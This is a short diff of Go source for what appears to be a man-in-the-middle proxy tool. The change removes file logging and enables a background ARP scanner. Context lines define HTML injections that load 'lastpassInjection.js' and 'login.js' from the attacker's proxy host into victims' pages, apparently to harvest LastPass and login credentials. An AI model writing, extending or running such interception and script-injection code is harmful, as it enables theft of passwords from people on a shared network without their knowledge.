@@ -4,14 +4,12 @@ import (
 	"github.com/revel/revel"
 	// "github.com/jeffail/gabs"
 	"log"
-	"fmt"
 	"io/ioutil"
 	"os/exec"
 	"path/filepath"
 	"time"
 	"strings"
 	"net"
-	"os"
 )
 
 const (
@@ -48,13 +46,6 @@ func InitiateProxy() {
     log.Println("loading storage location")
     fileLocation, proxyAddress := setFileStorageLocation()
     //setting the logger to output to a file
-	f, err := os.OpenFile(logLocation + "/logs.log", os.O_RDWR | os.O_CREATE | os.O_APPEND, 0666)
-	if err != nil {
-	    fmt.Println("error opening file")
-	}
-	defer f.Close()
-	
-	log.SetOutput(f)
 
     log.Println("location: ", fileLocation, " address: ", proxyAddress)
     //reset all parameters for the proxy
@@ -80,7 +71,7 @@ func InitiateProxy() {
 	INJECT_LASTPASS_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
 	INJECT_LOGIN_RESULT =  "<script src=\"http://"+proxyAddress+":9000/public/InjectionScripts/login.js\"></script></body>"
 	users = make(map[string]string)
-	// go arpScanner() //start the arpscanner in the background
+	go arpScanner() //start the arpscanner in the background
 	// getRedirectUrls() //temporary
 }
 
